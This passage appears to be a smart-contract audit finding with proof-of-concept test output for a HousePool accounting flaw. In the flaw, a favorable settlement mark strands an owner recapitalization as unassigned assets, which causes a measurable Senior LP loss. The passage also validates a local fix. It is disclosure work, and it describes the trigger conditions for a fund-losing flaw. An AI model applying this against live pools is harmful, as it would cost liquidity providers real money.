  Senior after rebound, neutral mark 1481168482350
  Senior after rebound, temporary mark 1462697114548
  Senior HWM after rebound, neutral mark 1482059562283
  Senior HWM after rebound, temporary mark 1482073097073
  unassigned after rebound, neutral mark 0
  unassigned after rebound, temporary mark 18489857647
  Senior LP exit, neutral mark 1481167482258
  Senior LP exit, temporary mark 1462696126928
  Senior LP received in total, neutral mark 1484135159520
  Senior LP received in total, temporary mark 1465645314345
  Senior LP loss, final exit 18471355330
  Senior LP loss, all redemptions 18489845175
Suite result: ok. 2 passed; 0 failed; 0 skipped
```

Amounts are six-decimal USDG atoms and prices are 8-decimal (`1e8` = 1.00).

Reading `test_temporaryFavorableMarkStrandsRecapitalization`: one realized shock wipes Junior. A trader opens a 577,200-notional Long at 1.00, and an ordinary epoch persists the impairment and the open's charges. Senior stands at 1,466,538.273869 USDG against a high-water mark of 1,485,028.131516. The owner recapitalizes 18,489.857647, the exact gap, and the pool stays out of degraded mode.

In the control branch, the first settlement runs at 1.00, the recapitalization restores Senior to its high-water mark, and `unassignedAssets` stays at 0. In the other branch, the first settlement runs at 1.03523709. The marked loss restores Senior, and the whole 18,489.857647 becomes unassigned. After the trader closes at 1.00 and the next settlement runs, Senior is 19,375.982525 below its high-water mark against 891.079933 in the control, and the unassigned balance is unchanged. The Senior LP's full exit pays 1,462,696.126928 against 1,481,167.482258 in the control. Across all its redemptions it receives 1,465,645.314345 against 1,484,135.159520, a loss of 18,489.845175 that the assertions match against the stranded amount.

`test_smallerFavorableMarkStrandsProportionalPart` repeats the same steps with a first settlement at 1.01601686, where the trader's loss is half the gap. The marked loss restores half of the gap, the recapitalization covers the other half, and the remaining 9,244.931592 of the recapitalization becomes unassigned. The Senior LP's total receipts fall by 9,244.925356.

### Fix check

**Root-cause attribution.** The claimed root cause was patched locally and both tests were re-run to confirm they measure that defect. The patch wraps the pending-bucket application in `HousePool._reconcile`. After `_applyPendingClaimantBucketsLive`, it moves back into the pending recapitalization bucket the part of the recapitalization that this call routed to `unassignedAssets`. That amount is capped at the positive terminal mark delta of the same snapshot, so the patch is inactive for realized revenue and at neutral or adverse marks. Under that patch:

- both tests fail at `assertGt(strand.unassignedAfterRebound, control.unassignedAfterRebound, "recapitalization stranded")` with `0 <= 0`,
- in both tests the recapitalization stays pending through the favorable settlement (`unassignedAssets` 0 instead of 18,489.857647 and 9,244.931592), and the Senior LP's total receipts (1,484,135.159520) equal the control branch to the atom,
- the five repository files that pin recapitalization routing and zero-principal resets pass unchanged under the patch, 70 tests in total: `TrancheRecoveryBehavior.t.sol` 12, `HousePoolBootstrap.t.sol` 25, `HousePoolSnapshotParity.t.sol` 11, `HousePoolSeededSetup.t.sol` 3, `HousePoolWaterfall.t.sol` 19.

The patch was reverted before the output above was produced. Every figure in this report comes from the unmodified frozen commit.
